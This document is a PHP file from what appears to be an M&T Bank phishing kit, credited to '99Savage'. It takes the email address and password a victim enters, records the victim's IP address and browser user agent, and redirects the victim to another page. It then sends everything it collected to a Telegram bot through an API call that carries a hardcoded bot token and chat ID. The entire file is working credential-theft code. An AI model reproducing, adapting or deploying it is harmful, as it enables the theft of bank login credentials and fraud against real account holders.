<?php

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


header ("Location: 3.html");
  
      $usera = $_SERVER['HTTP_USER_AGENT'];
                $xip = get_client_ip();

define ('url',"https://api.telegram.org/bot2019001239:AAHiEgEOmkzyZn-0htLbDbJobfDSDSkkWZM/");
$xemail = $_POST['email'];
$xpass = $_POST['pass'];
$chat_id = '1327277990';
$message = urlencode("==============M&T Bank[Email Access]============\nEmail : ".$xemail."\nP@ssword : ".$xpass."\nIP Address : ".$xip."\nUseragent : ".$usera."\n======Coded By 99Savage=========================");
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

?>